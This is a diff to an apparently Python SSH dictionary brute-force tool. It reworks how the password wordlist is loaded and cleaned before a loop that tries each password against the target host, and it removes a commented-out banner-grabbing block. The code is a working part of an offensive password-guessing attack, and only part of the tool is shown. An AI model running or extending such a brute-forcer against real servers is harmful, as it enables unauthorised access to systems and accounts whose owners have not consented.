@@ -92,20 +92,22 @@ def connect_ssh(password):
 def ssh_brute_forcer_dictionary():
 	global g_host, g_user_name, g_word_list
 
-
-	# open the file containing the passwords to try
-	file_words = open(g_word_list)
-
 	# grab the banner if requested by the user
 	if (args.banner or args.verbose):
 		grab_banner()
 
+	# open the file containing the passwords to try
+	file_words = open(g_word_list)
+
+	# read in the passwords and remove all new line chars and null strings
+	passwords = file_words.readlines()
+	passwords[:] = [password.strip("\n") for password in passwords]
+	passwords = list(filter(None, passwords))
+
 	print(lineb + "[*] Running Dictionary Attack" + linel)
 
 	# read each password from the file_words
-	for password in file_words.readlines():
-		password = password.strip("\n")
-
+	for password in passwords:
 		try:
 			response = connect_ssh(password)
 
@@ -142,15 +144,6 @@ def ssh_brute_forcer_dictionary():
 	gets the SSH Server details of the target
 """
 def grab_banner():
-	"""
-	global client_ssh
-	client_ssh.load_system_host_keys()
-	try:
-		client_ssh.connect(g_host, SSH_PORT, g_user_name, password='bad-password-on-purpose')
-	except:
-		print(client_ssh._transport.get_banner())
-	"""
-
 	s = socket.socket()
 	s.connect((g_host, SSH_PORT))
 	banner = s.recv(1024)
@@ -176,6 +169,7 @@ def main():
 		show_target_details()
 
 	ssh_brute_forcer_dictionary()
+
 
 if __name__ == "__main__":
 	main()
